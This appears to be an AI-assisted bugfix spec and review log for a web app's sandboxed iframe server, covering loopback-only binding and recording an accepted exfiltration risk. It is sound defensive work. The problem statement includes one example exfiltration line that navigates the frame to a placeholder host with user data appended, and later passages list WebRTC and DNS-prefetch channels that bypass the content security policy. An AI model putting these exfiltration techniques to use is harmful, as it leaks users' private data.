---
title: 'DW-47/DW-48: Ring-3 sandbox exposure posture — loopback-only bind + recorded exfil residual'
type: 'bugfix'
created: '2026-07-27'
status: 'in-review'
review_loop_iteration: 0
followup_review_recommended: true
context: []
warnings: [oversized]
baseline_revision: '40b8d064a37a66f8ebc328798ebd8c1cc3b1ce17'
final_revision: '2bf780056e63e1bbafd8d639c16684fb0d091861'
---

<intent-contract>

## Intent

**Problem:** Two user-decided security postures at the Ring-3 sandbox seam are unrecorded in code. (DW-48) `startCore` passes the Core `bindHost` straight into the sandbox `Bun.serve`, so `QS_HOST=0.0.0.0` LAN-exposes the tokenless guest origin — while `deriveOpenUrl` normalizes the injected `__QS_SANDBOX_ORIGIN__` to loopback, so a remote browser is pointed at an origin it cannot reach and the preview pane silently blanks. (DW-47) `sandbox-host.ts` describes the pushed `FrozenData` as "already-public" / "public data", which understates it: it is the user's real query output, and `connect-src 'none'` does not govern scripted same-frame navigation (`window.location = "http://host/?" + data`), so a hostile guest could still exfiltrate it.

**Approach:** (DW-48) Clamp the sandbox bind to loopback by construction inside `startSandboxServer` — a pure `sandboxBindHost()` in `binding.ts` maps any non-loopback bind to the same-family loopback (`0.0.0.0`/IPv4/hostname → `127.0.0.1`, `::`/IPv6 → `::1`), and BOTH the `Bun.serve` hostname and `deriveOpenUrl` use that one clamped value, so bind and navigable origin can never disagree. Document in the Port-Exposure Warning and the README that report visualizations render only on the host machine in exposed mode. (DW-47) Replace the understating comments with the accepted residual, recorded explicitly at every site that carries the claim, with the revisit trigger.

## Boundaries & Constraints

**Always:**
- The sandbox `Bun.serve` binds a loopback host in EVERY configuration — never a wildcard, never a routable address.
- The clamped host is the single input to both `Bun.serve({hostname})` and `deriveOpenUrl` inside `startSandboxServer`; there is exactly one host value in that function.
- A bind host that is ALREADY loopback (`localhost`, `127.0.0.0/8`, `::1`) passes through VERBATIM — today's loopback behavior, origins and tests are byte-identical.
- Address family is preserved: an IPv6 bind clamps to `::1` (so `deriveOpenUrl` still yields `http://[::1]:<port>`), an IPv4/hostname bind clamps to `127.0.0.1`.
- The Core server's own bind is untouched — `QS_HOST` still exposes the Core exactly as before, and `core.exposed` / the Port-Exposure Warning trigger unchanged.
- DW-47 is documentation-only: no behavioral change to `pushDoc`, `targetOrigin: "*"`, the identity/opaque-origin gates, `GUEST_CSP`, or the iframe `sandbox` token list.

**Block If:**
- (none — both postures are already user-decided in the DW-47/DW-48 ledger entries; this spec only records them.)

**Never:**
- Do NOT add `allow-top-navigation` / any sandbox-navigation block, do NOT gate `pushDoc` on a handshake, and do NOT change `targetOrigin` away from `"*"` — the user chose ACCEPT over the recommended navigation block.
- Do NOT make the sandbox reachable remotely (no exposed-mode sandbox origin, no tunnel, no proxy through the Core) — that is the false-success option the decision rejected.
- Do NOT edit `_bmad-output/implementation-artifacts/deferred-work.md` — the orchestrator owns ledger writes.
- Do NOT weaken `frame-src` (no scheme source, no `*`) to compensate for an unreachable sandbox off-host.
- Do NOT add a test that boots a real `startCore({host: "0.0.0.0", …})`. `server.test.ts:259-264` records this as a deliberate project rule — a real wildcard Core boot opens a token-bearing endpoint to the whole LAN for the duration of the run. The clamp is proven at the `sandboxBindHost` unit level and at the sandbox-only `startSandboxServer` level (which carries no token and no `/rpc`).

## I/O & Edge-Case Matrix

| Scenario | Input / State | Expected Output / Behavior | Error Handling |
|----------|--------------|---------------------------|----------------|
| Default bind | `sandboxBindHost("127.0.0.1")` | `"127.0.0.1"` (verbatim) | No error expected |
| Named loopback | `sandboxBindHost("localhost")` | `"localhost"` (verbatim) | No error expected |
| Loopback range | `sandboxBindHost("127.0.0.53")` | `"127.0.0.53"` (verbatim) | No error expected |
| IPv6 loopback | `sandboxBindHost("::1")` | `"::1"` (verbatim) | No error expected |
| IPv4 wildcard | `sandboxBindHost("0.0.0.0")` | `"127.0.0.1"` | No error expected |
| IPv6 wildcard | `sandboxBindHost("::")` | `"::1"` | No error expected |
| Bracketed IPv6 | `sandboxBindHost("[::]")` | `"::1"` | No error expected |
| Routable IPv4 | `sandboxBindHost("192.168.1.50")` | `"127.0.0.1"` | No error expected |
| Routable IPv6 | `sandboxBindHost("fe80::1")` | `"::1"` | No error expected |
| Hostname bind | `sandboxBindHost("dev.local")` | `"127.0.0.1"` | No error expected |
| Loopback-lookalike | `sandboxBindHost("127.attacker.example")` | `"127.0.0.1"` (NOT loopback per `isLoopbackHost`) | No error expected |
| Exposed server bind | `startSandboxServer({host: "0.0.0.0", port: 0, …})` | binds `127.0.0.1`; `origin === "http://127.0.0.1:<port>"` | No error expected |
| Exposed IPv6 bind | `startSandboxServer({host: "::", port: 0, …})` | binds `::1`; `origin === "http://[::1]:<port>"` | No error expected |
| Guest still served after clamp | `startSandboxServer({host: "0.0.0.0", …})` then `GET ${origin}/` | 200 with the guest HTML under `GUEST_CSP` — the clamp does not break serving | No error expected |

</intent-contract>

## Code Map

- `src/core/binding.ts` -- pure bind-host module; owns `resolveBindHost` / `isLoopbackHost` / `isWildcardHost` / `deriveOpenUrl`. New pure `sandboxBindHost` belongs here.
- `src/core/binding.test.ts` -- unit tests for the above; conventions to mirror for the new matrix.
- `src/core/sandbox-server.ts` -- `startSandboxServer` (line ~123) passes `host` into `Bun.serve({hostname})` and `deriveOpenUrl(host, boundPort)` (line ~152). The clamp goes HERE so no caller can bind the guest off-loopback. Module docstring (line ~1) and `GUEST_CSP` docstring (line ~46, the `connect-src 'none'` egress claim) are the DW-47 recording sites.
- `src/core/sandbox-server.test.ts` -- line ~95 `describe("navigable origin under wildcard / IPv6 binds")`; the `0.0.0.0` test's comment ("The server BINDS the raw wildcard") becomes false and must be re-pointed at the clamp.
- `src/core/server.ts` -- line ~1027 comment claims the sandbox binds "the SAME host"; line ~1033 `startSandbox({ host: bindHost, … })`. Comment must state the clamp; the call stays.
- `src/core/server.test.ts` -- line ~206 `core.sandboxOrigin is a distinct loopback origin…` (must stay green); lines 259-264 record the standing NO-real-wildcard-boot rule. Read-only for this change.
- `src/ui/sandbox/sandbox-host.ts` -- module docstring (lines 4–15) and the `pushDoc` inline comment (lines 116–117) carry the understating "already-public / public data" claims DW-47 names.
- `src/shared/contract.ts` -- line ~750 carries the third "already-public canonical" claim on the `render` inbound frame.
- `bin/quick-studio.ts` -- line ~184 Port-Exposure Warning block; where the exposed-mode visualization note goes.
- `README.md` -- the `QS_HOST` bullet (line ~177) under "Flags"/env behavior.

## Tasks & Acceptance

**Execution:**
- [x] `src/core/binding.ts` -- Add exported pure `sandboxBindHost(bindHost: string): string`: trim+lower-case (mirroring `deriveOpenUrl`), return the input verbatim when `isLoopbackHost` accepts it, else return `"::1"` when the host is IPv6-shaped (`::`, or contains `:`, incl. bracketed) and `"127.0.0.1"` otherwise. Docstring states WHY (DW-48: the guest is tokenless and must never be LAN-reachable) and that family preservation keeps `deriveOpenUrl`'s IPv6 bracketing correct. -- One rule, unit-testable, no server needed.
- [x] `src/core/sandbox-server.ts` -- Apply `sandboxBindHost(host)` once at the top of `startSandboxServer` and use that single clamped value for BOTH `Bun.serve({hostname})` and `deriveOpenUrl`. Update `StartSandboxServerOptions.host` doc to "requested bind host — clamped to loopback". Record the DW-47 residual on `GUEST_CSP`'s `connect-src 'none'` explanation: the egress block covers scripted REQUESTS, not scripted same-frame navigation, so a hostile guest could still carry `FrozenData` off-machine via `window.location`; accepted because the guest only ever receives the user's own already-visible output, and revisit if untrusted/shared reports are introduced. Update the module docstring's "SAME host Core binds" claim. -- Loopback-only by construction; residual recorded where the claim lives.
- [x] `src/core/server.ts` -- Update the Ring-3 comment at the `startSandbox` call site: the sandbox binds LOOPBACK even when the Core is exposed (`QS_HOST=0.0.0.0`), so the tokenless guest is never LAN-reachable, and the consequence is that report visualizations render only on the host machine in exposed mode. -- Kills the now-false "SAME host" claim at the call site.
- [x] `src/ui/sandbox/sandbox-host.ts` + `src/shared/contract.ts` -- Replace the "already-public FrozenData" / "the payload is public data" claims (`sandbox-host.ts` module docstring lines 4–15 and the `pushDoc` comment lines 116–117; `contract.ts:750` "already-public canonical") with the accurate statement: the payload is the user's own query output, `targetOrigin: "*"` is mandatory against an opaque origin and delivery is confined to this one iframe window, and the DW-47 residual (scripted same-frame navigation defeats `connect-src 'none'`) is accepted and recorded, to be revisited if untrusted/shared reports are ever introduced. -- The understatement DW-47 names, corrected at every site that carries it.
- [x] `bin/quick-studio.ts` + `README.md` -- Add the exposed-mode note to the Port-Exposure Warning body and the `QS_HOST` README bullet: the Ring-3 sandbox stays loopback-only, so report visualizations render only on the host machine; remote viewers get an empty preview pane. -- The user-facing half of the DW-48 decision.
- [x] `src/core/binding.test.ts` -- Add a `sandboxBindHost` describe covering every I/O-matrix row (all loopback pass-throughs, both wildcards, bracketed `[::]`, routable v4/v6, hostname, `127.attacker.example`). -- Locks the clamp rule.
- [x] `src/core/sandbox-server.test.ts` -- Re-point the `describe("navigable origin under wildcard / IPv6 binds")` block at the clamp: rename it and rewrite the stale "the server BINDS the raw wildcard" comment; assert that a `0.0.0.0` request yields `http://127.0.0.1:<port>` AND that `GET ${origin}/` returns 200 (the clamp binds where the origin points); add a `::` case asserting `http://[::1]:<port>`; keep the `::1` verbatim case. -- Proves the bind, not just the string.

**Acceptance Criteria:**
- Given `QS_HOST=0.0.0.0`, when the Core boots, then the Core is exposed but the sandbox server's listening socket is loopback-only and `core.sandboxOrigin` is a `127.0.0.1` origin that serves the guest document.
- Given any bind host, when `startSandboxServer` runs, then the host it binds and the host inside `origin` derive from the same clamped value, so the injected `__QS_SANDBOX_ORIGIN__` can never name an origin the sandbox is not listening on.
- Given a loopback `QS_HOST` (unset, `localhost`, `127.0.0.1`, `::1`), when the Core boots, then every observable value (`sandboxOrigin`, `frame-src`, iframe `src`) is byte-identical to before this change.
- Given exposed mode, when the operator reads stderr and the README, then both state that report visualizations render only on the host machine.
- Given a reader of `sandbox-host.ts` or `sandbox-server.ts`, when they reach the pushed-data or `connect-src 'none'` claims, then they find the DW-47 residual stated explicitly with its revisit trigger, and no "already-public"/"public data" characterization of `FrozenData` remains.

## Spec Change Log

## Review Triage Log

### 2026-07-27 — Review pass
- intent_gap: 0
- bad_spec: 0
- patch: 9: (high 0, medium 3, low 6)
- defer: 5: (high 0, medium 3, low 2)
- reject: 3
- addressed_findings:
  - `[medium]` `[patch]` The DW-47 residual claimed closing scripted same-frame navigation "would require navigate-to/frame-src-style navigation blocking that no shipping browser implements interoperably" — false in a way that overstated the exposure: the shell already emits `frame-src <sandboxOrigin>`, and an embedder's `frame-src` IS enforced by Chromium/Gecko on a child frame's own navigations, so a guest navigating to a remote host is in practice blocked, and a navigation it IS allowed reaches only our own 404 handler. Rewrote the paragraph to state the mitigation AND why the residual still stands (a framing control leaned on as an egress control, in a different policy on a different origin, with self-navigation enforcement no test in this repo pins).
  - `[medium]` `[patch]` Every new user-facing note named the WRONG surface. `SandboxFrame`'s only consumer is `ChatTabView` (chat answers carrying a chart fence); the Report tab draws in-app with Recharts (`report/ReportChart.tsx`) and is unaffected. An operator reading "report visualizations" would conclude their Report tabs were broken remotely and never learn their chat answers were the casualty. Corrected in `README.md`, the stderr Port-Exposure Warning, the `ExposureBanner`, and the `server.ts` call-site comment, with the DW-48 ledger's own shorthand flagged as the source of the mis-naming.
  - `[medium]` `[patch]` The loss off-host is wider than "an empty preview pane": `decideMessageView` sets `showBubble: chartDoc === null`, so a chart-bearing answer has no prose bubble to fall back to and the remote viewer loses the ENTIRE answer. Stated on all three surfaces instead of the understated version.
  - `[medium]` `[patch]` The note went only to stderr + README — the two surfaces only the host OPERATOR sees — while the person who actually hits the blank pane is a remote viewer whose only surface is the in-page `ExposureBanner`, which the README itself advertises as a co-equal warning surface. Added the consequence to `ExposureBanner` (copy + docstring explaining why this surface is the load-bearing one).
  - `[low]` `[patch]` `Core.sandboxOrigin`'s exported JSDoc still read "a distinct loopback port bound to the same host as Core" — the exact claim this change makes false, and the more externally visible of the two copies. Rewritten; the stale `server.test.ts:208` "same host, DIFFERENT port" comment fixed alongside it.
  - `[low]` `[patch]` `sandboxBindHost`'s docstring said it "inherits its validated dotted-quad match" — `LOOPBACK_V4_RE` checks shape, not 0-255 range, so `127.1.2.999` classifies as loopback. Dropped the unearned "validated" and named the inherited limitation explicitly (harmless here: Core's own `Bun.serve` rejects the address first).
  - `[low]` `[patch]` The docstring called the clamp "the loopback address of the SAME address family" when it is an `h.includes(":")` string test, not a resolver: an AAAA-only NAME clamps to `127.0.0.1` and a stray-colon typo reads as IPv6. Re-described as "shape of the literal" and the divergence named.
  - `[low]` `[patch]` `sandbox-host.ts` claimed "no other frame, opener or embedder receives the frame" without noting that the window handle pins the WINDOW, not the document loaded in it. Qualified, and the exposed-mode foreign-document case recorded where the data actually leaves Ring 2.
  - `[low]` `[patch]` Two test-comment overclaims: the `sandbox-server.test.ts` preamble promised "these tests assert the bind, not just the derived string" while only the IPv4 case fetches (IPv6 loopback round-trips are not portable across CI boxes), and `binding.test.ts` titled a fixed 10-element table a property test. Both rewritten to say what they actually cover, with the IPv6 gap and what covers it instead stated.
  - defer (NOT written to the ledger — the orchestrator owns ledger writes for this bundle; captured under Auto Run Result -> Residual risks): the exposed-mode foreign-listener `pushDoc` case, `/live/<id>` injecting the session token into a link-shareable page, the unreleased Core socket when the sandbox boot throws, `LOOPBACK_V4_RE`'s missing range check, and the absent guest ready-handshake/timeout.
  - reject (dropped): "the concrete-IP exposed bind was silently swept in and never re-decided" (DW-48's decision is categorical — "never LAN-expose the tokenless guest" — and `isExposed` is the project's existing definition of exposed mode; the behavior change is documented on three surfaces); adding a `boundHost` to `SandboxServer` or demoting `host` to a family hint (API redesign the spec deliberately did not choose); "the residual is copy-pasted into four files" (the paragraphs are tailored per site, and drift is now guarded by pointing the satellites at the canonical `GUEST_CSP` record).

### 2026-07-27 — Review pass (follow-up, independent)
- intent_gap: 0
- bad_spec: 0
- patch: 9: (high 0, medium 3, low 6)
- defer: 4: (high 0, medium 3, low 1)
- reject: 5
- addressed_findings:
  - `[medium]` `[patch]` The headline user-facing claim shipped by the PREVIOUS pass is false. All four surfaces said a remote viewer "loses that whole answer, not just the picture" — but `ChatTabView` gates only `MarkdownBody` on `showBubble`; `ChatQueryRun` (generated SQL, KPI tiles, full result grid) renders unconditionally, and a `chartDoc` only exists for a run that produced rows, so that grid is always populated. The remote viewer loses the chart and its prose narration, and keeps the data. `README.md` was additionally self-contradictory in one sentence ("loses that whole answer … they see an empty pane"). Corrected in `README.md`, the stderr Port-Exposure Warning, the `ExposureBanner` copy + docstring, and the `server.ts` call-site comment.
  - `[medium]` `[patch]` The mis-naming the previous pass reports as fixed survived at the ONE site that change designates canonical. `sandbox-server.ts`'s module docstring still read "report visualizations render only on the host machine and remote viewers get an empty preview pane" — verbatim both defects (wrong surface, understated loss) — while `sandbox-host.ts` and `contract.ts` were rewritten to point AT that docstring rather than duplicate it. The four satellites and the canonical record disagreed on day one, inverting the anti-drift design. Rewritten with the corrected surface and the corrected scope.
  - `[medium]` `[patch]` The DW-47 residual record billed its analysis as closed ("stated plainly") and enumerated only navigation channels, so a future reader would conclude that blocking navigation retires the residual. It omits `RTCPeerConnection` — CSP3's `webrtc` directive is unset here and does NOT fall back to `default-src`, so STUN/TURN exfil needs no navigation at all — and `<link rel="dns-prefetch">` / `rel="preconnect"`, which no current fetch directive constrains. Both also survive the `frame-src` mitigation, which is a navigation control. Added, with the exhaustiveness framing dropped; also recorded that the `frame-src` argument silently depends on `allow-popups` staying absent from the iframe `sandbox` token list.
  - `[low]` `[patch]` `sandbox-server.test.ts`'s new block comment claimed the IPv4 case "asserts the BIND, not just the derived string — a `0.0.0.0` request that produced a `127.0.0.1` origin while still listening on the wildcard would pass a string-only assertion". A server bound to `0.0.0.0` also answers on `127.0.0.1`, so that exact regression passes the fetch green: the test cannot refute a wildcard socket. Rewritten to state what it does cover (the derived origin for every clamped shape; that the IPv4 origin is live), what it cannot, what covers the gap instead (one host value by construction + `binding.test.ts`), and what a real negative assertion would look like and why it is absent.
  - `[low]` `[patch]` "No present or future caller can bind the guest off-loopback" and `Core.sandboxOrigin`'s "always bound to LOOPBACK" are both false: `StartCoreOptions.startSandboxServer` replaces the factory wholesale (a seam `server.test.ts` already exercises) and `startCore` never checks the returned origin. Both docstrings now name the seam; the structural fix is deferred (DW-102).
  - `[low]` `[patch]` `sandboxBindHost`'s docstring dismissed the `127.1.2.999` case with "nothing binds it, because Core's own `Bun.serve` rejects the address before this is reached" — a property of ONE call order, contradicting the same docstring's claim that the guarantee belongs to the function rather than any call site, and untrue for direct callers (this repo's tests are direct callers). Rewritten to separate containment (holds unconditionally) from bindability and diagnosis (do not).
  - `[low]` `[patch]` The previous pass removed the unearned word "validated" from exactly one of its three occurrences. `binding.ts:34` and `binding.ts:40` — the docstring that is the ORIGIN of the claim — plus `binding.test.ts:152` still said the `127.0.0.0/8` match was validated. Removed everywhere, with the missing 0-255 range check named at the regex itself.
  - `[low]` `[patch]` `Workspace.tsx`'s docstring quoted `decideMessageView` as setting `showBubble: chartDoc === null`; the actual expression is `chartDoc === null && !reportOnlyBlank`. A cross-module docstring quoting a stale expression is exactly the drift this change's "point at the canonical record" principle exists to avoid. Corrected as part of the rewrite.
  - `[low]` `[patch]` Two more sites carrying claims this change falsified: `server.ts`'s CSP docstring said the sandbox differs from the shell by "a DIFFERENT loopback PORT" (under an exposed Core it is now a different HOST too), and the boot diagnostic still warned that "report visualizations will not render" on an unusable sandbox origin — operator-facing, wrong surface. Both corrected.
  - defer (4 NEW entries appended to the ledger as DW-101..DW-104, per the invocation's append-only instruction; no existing entry touched): the unreleased Core socket when the sandbox boot throws and how the clamp widened its trigger class (DW-101), the unvalidated injected-factory seam (DW-102), the missing sandbox load timeout that makes the documented off-host path silent (DW-103), and `LOOPBACK_V4_RE`'s missing octet-range check now that the predicate is a containment control (DW-104).
  - reject (dropped): "the verbatim-loopback bind lost its coverage, so a hard-coded `127.0.0.1` inside `startSandboxServer` would pass the whole suite" — false, the `::1` verbatim case at `sandbox-server.test.ts` expects `http://[::1]:<port>` and would fail; `QS_HOST=localhost` should clamp because `/etc/hosts` could map it off-loopback (the I/O matrix mandates verbatim pass-through for `localhost`, and the hosts file is operator-owned — this is the operator overriding their own machine, not an attacker); `QS_HOST=[::1]` makes `isLoopbackHost` false and mis-fires the exposure warning (pre-existing, and the clamp still outputs `::1`, so containment is unaffected; a bracketed hostname fails the Core's own bind first); `contract.ts` no longer self-classifies the payload and leans on a prose pointer (the pointer is one hop, to a docstring in the same repo); and the Acceptance Criteria still spell the consequence in the ledger's "report visualizations" shorthand (the code deliberately corrected that vocabulary and documented WHY on five surfaces — retro-editing a frozen spec's ACs is an orchestrator call, not a dev-session patch).

## Design Notes

Family preservation is load-bearing, not cosmetic: clamping an IPv6 bind to `127.0.0.1` would work, but clamping to `::1` keeps `deriveOpenUrl`'s bracketing path (`http://[::1]:<port>`) exercised on exactly the binds that reach it today, so the recorded CSP3 `host-part` IPv6 residual in `shellCspHeaders` stays an accurate description of the IPv6 path rather than silently becoming dead.

The clamp lives INSIDE `startSandboxServer` rather than at the `startCore` call site so the guarantee is a property of the sandbox origin itself — no present or future caller can bind the tokenless guest off-loopback by passing the wrong host. `startCore` keeps passing `bindHost`; only its comment changes.

Off-host consequence, stated plainly because it is the accepted cost: a remote browser loading the exposed Core resolves the injected sandbox origin against ITS OWN loopback, so the preview pane is empty (or, if that viewer happens to run something on the same port, the frame loads a foreign document which `pushDoc` then posts the render frame to with `targetOrigin: "*"` — data that viewer already holds, so no privilege is crossed). Both outcomes fail visibly and locally; neither exposes the guest to the LAN, which is what the decision optimized for.

## Verification

**Commands:**
- `export PATH="$HOME/.bun/bin:$PATH" && bun run build` -- expected: succeeds. Regenerates the UI/sandbox/snapshot/report bundles the tests import; a prerequisite, not an assertion.
- `export PATH="$HOME/.bun/bin:$PATH" && bun test src/core/binding.test.ts src/core/sandbox-server.test.ts src/core/server.test.ts src/ui/sandbox/ src/sandbox/` -- expected: all pass, including the new clamp cases; no pre-existing sandbox/containment test regresses.
- `export PATH="$HOME/.bun/bin:$PATH" && bunx tsc --noEmit` -- expected: no type errors.
- `grep -rn "already-public\|already public\|public data" src/ui/sandbox/sandbox-host.ts src/shared/contract.ts` -- expected: no matches (the DW-47 understatement is gone from every site).

## Auto Run Result

Status: done

**Implemented change:** DW-48 (code) — the Ring 3 sandbox origin now binds LOOPBACK in every configuration. A pure `sandboxBindHost()` in `binding.ts` passes an already-loopback host through verbatim and clamps anything else to a loopback address matching the literal's shape (`::`/IPv6-shaped -> `::1`, everything else -> `127.0.0.1`). The clamp is applied INSIDE `startSandboxServer`, and that single value feeds both `Bun.serve({hostname})` and `deriveOpenUrl`, so the socket and the advertised `__QS_SANDBOX_ORIGIN__` can no longer disagree. `QS_HOST=0.0.0.0` therefore exposes the Core (unchanged) while the tokenless guest stays off the LAN, and the false-success of advertising an unreachable origin is gone. DW-47 (documentation) — the "already-public frozen data" characterization is removed from every site that carried it and replaced with the accepted residual: the payload is the user's own query output, `connect-src 'none'` governs scripted requests but not scripted same-frame navigation, the trade is accepted, and it must be revisited the moment untrusted or shared reports exist.

**Files changed:**
- `src/core/binding.ts` — new exported pure `sandboxBindHost`; docstring covers the tokenless-guest rationale, the shape-not-family caveat, and the inherited `LOOPBACK_V4_RE` range limitation.
- `src/core/sandbox-server.ts` — clamp applied once at the top of `startSandboxServer` (one host value in the function); `StartSandboxServerOptions.host` redocumented as a request; module docstring's "SAME host Core binds" claim replaced; `GUEST_CSP` docstring is now the canonical DW-47 record, including what the shell's `frame-src` already mitigates.
- `src/core/server.ts` — `Core.sandboxOrigin` JSDoc and the Ring-3 call-site comment corrected; the asymmetry argument rests on "the guest has no gate", explicitly not on the token being airtight.
- `src/ui/sandbox/sandbox-host.ts` — understating claims replaced; window-handle bound qualified (it pins the window, not the document); exposed-mode foreign-document case recorded; points at the canonical record instead of duplicating it.
- `src/shared/contract.ts` — `SandboxInbound` docstring corrected, with a pointer to the canonical record.
- `bin/quick-studio.ts`, `README.md`, `src/ui/workspace/Workspace.tsx` — the exposed-mode consequence on all three exposure surfaces, naming the correct surface (chat answers carrying a chart, not the Report tab) and the correct loss (the whole answer, since a chart answer has no prose bubble).
- `src/core/binding.test.ts` — `sandboxBindHost` suite covering every I/O-matrix row plus normalization and the clamp invariant.
- `src/core/sandbox-server.test.ts` — wildcard/IPv6 block re-pointed at the clamp; the `0.0.0.0` case now fetches the reported origin (proving bind and origin agree); new `::` -> `[::1]` case; stale comments replaced.
- `src/core/server.test.ts` — stale "same host" comment corrected (no behavioral test change).

**Review findings breakdown:** 9 patches applied (3 medium: an inaccurate navigation-mitigation claim, the wrong user-facing surface named, and the missing in-page banner surface; 6 low: stale/overclaiming docstrings and test comments). 5 deferred, 3 rejected — see Review Triage Log.

**Verification:** `bun run build` -> succeeded. `bun test` (full suite) -> **1920 pass, 1 skip, 0 fail**, 10310 expect calls across 87 files; the skip and the two `[rpc] handler threw` stderr lines are pre-existing intentional test output. `bunx tsc --noEmit` -> clean. `grep -rn "already-public\|already public\|public data" src/ui/sandbox/sandbox-host.ts src/shared/contract.ts` -> no matches. Every loopback configuration is byte-identical to before the change (verbatim pass-through), which the untouched pre-existing sandbox/CSP/containment suites confirm.

**Residual risks (recommended deferrals — orchestrator to record on the ledger):**
- Exposed mode + remote viewer: the injected sandbox origin resolves against the VIEWER's machine, so if any unrelated process is listening on that ephemeral port the iframe loads a foreign document — serving its own headers, so `GUEST_CSP` does not apply to it — and `pushDoc` posts the full render frame into it with `targetOrigin: "*"`. Pre-existing (`deriveOpenUrl` already normalized the injected origin to loopback before this change), and the recipient is a process on the viewer's own box, but it is not "delivery confined to our guest".
- `/live/<id>` injects the per-boot session token into a page explicitly designed to be opened by link (`server.ts`, Story 6.4). In exposed mode, sharing a live-report URL hands the recipient the token that gates `/rpc`. Pre-existing and orthogonal to this change, but it undercuts any argument that leans on the token as the exposure boundary.
- `startCore` boots the sandbox AFTER the Core `Bun.serve` is already listening, with no `try`/`finally` around it — a throw from `startSandboxServer` (port exhaustion, an unbindable loopback) propagates out of `startCore` leaving the Core socket bound and unreleased. Pre-existing.
- `LOOPBACK_V4_RE` (`/^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$/`) checks shape, not the 0-255 octet range, so `QS_HOST=127.1.2.999` is classified loopback: no Port-Exposure Warning fires and the boot dies on a misleading `Bun.serve` port error. Pre-existing, in `isLoopbackHost`.
- There is no guest `ready` handshake gating `pushDoc` and no load timeout on the sandbox iframe, so a frame that never loads produces no error signal at all (`onError` only fires on guest-emitted signals). Off-host in exposed mode this is exactly the blank-pane path; the DW-47 decision explicitly ruled a `pushDoc` handshake out of scope, so this is recorded rather than fixed.
- Accepted by user decision, restated: DW-47's scripted same-frame navigation exfil (narrowed but not closed by the shell's `frame-src`), and the DW-48 cost that a concrete-IP exposed bind (`QS_HOST=192.168.1.50`) no longer renders chat charts for remote viewers — the categorical "never LAN-expose the tokenless guest" covers it, and it is documented on all three exposure surfaces.

---

### Follow-up review pass — 2026-07-27

Status: done

**What this pass changed:** documentation and comments only — zero behavioral change, zero API change, zero test-assertion change. The clamp, the origins and the 1920-test suite are byte-identical in behavior to the previous pass. What was wrong was the PROSE, which in a story whose DW-47 half is documentation-only and whose DW-48 half ships its user-facing value as copy on three exposure surfaces, is the deliverable.

Three medium findings shared one shape: the previous pass's own corrections were themselves inaccurate or incompletely swept.
1. The corrected user-facing copy overshot — it told operators and remote viewers that a chart-bearing answer is lost entirely off-host, when the SQL and the full result grid still render beside the blank frame. That would have sent someone hunting a bug that does not exist, and it quietly obscured that the query output the clamp is meant to keep off the LAN is still being rendered to that remote viewer in the grid.
2. The "wrong surface / understated loss" correction reached four satellite sites and missed the one the same commit designates as the canonical record — the site the satellites were rewritten to point at.
3. The DW-47 residual record presented its channel analysis as settled while omitting `RTCPeerConnection` (uncovered by `connect-src`, no `default-src` fallback for CSP3's `webrtc`) and speculative-connection hints. Since that record is explicitly the artifact a future "untrusted or shared reports" revisit is supposed to reason from, an enumeration that reads exhaustive and is not would have produced a navigation block shipped as a closed vector.

**Files changed:** `src/core/sandbox-server.ts` (canonical record: surface + scope corrected, DI seam named, residual enumeration widened and de-absolutised, `allow-popups` dependency recorded), `src/core/server.ts` (`Core.sandboxOrigin` DI caveat, CSP docstring's port-only claim, call-site consequence, boot diagnostic wording), `src/core/binding.ts` (`LOOPBACK_V4_RE`/`isLoopbackHost` "validated" removed and the range gap named at the regex; `sandboxBindHost`'s circular call-order argument replaced with a containment-vs-bindability split), `src/core/binding.test.ts` + `src/core/sandbox-server.test.ts` (comment corrections — the IPv4 fetch no longer claims to prove a loopback-only socket), `src/ui/workspace/Workspace.tsx`, `bin/quick-studio.ts`, `README.md` (the corrected consequence on all three exposure surfaces).

**Review findings breakdown:** 9 patches applied (3 medium, 6 low), 4 deferred as NEW ledger entries `DW-101`–`DW-104` (3 medium, 1 low; no existing entry read, modified or re-opened), 5 rejected. No `intent_gap`, no `bad_spec` — no loopback was triggered and `review_loop_iteration` stayed at 0.

**Verification:** `bun run build` → succeeded. `bunx tsc --noEmit` → clean. `bun test` (full suite) → **1920 pass, 1 skip, 0 fail**, 10310 expect calls across 87 files — identical to the previous pass, as expected for a comment-only change. `grep -rn --exclude="*.generated.ts" "report visualization\|whole answer\|entire answer\|empty preview pane\|validated dotted" src/ bin/ README.md` → no matches, i.e. every stale phrasing this pass targeted is gone repo-wide, not just at the sites the reviewers named.

**Residual risks:** the four deferred items are on the ledger (`DW-101`–`DW-104`). Beyond those: the three exposure-surface copies still have no automated coverage — there is no `Workspace.test.tsx` and the repo asserts components with `renderToStaticMarkup`, so the corrected wording could be deleted by a layout refactor invisibly; that gap is the already-tracked DOM-test-harness deferral, not a new one. And the pattern that produced findings 1 and 2 — a "corrected everywhere" sweep that missed a site, twice now, in the same file set — is itself the reason a further independent pass is recommended.
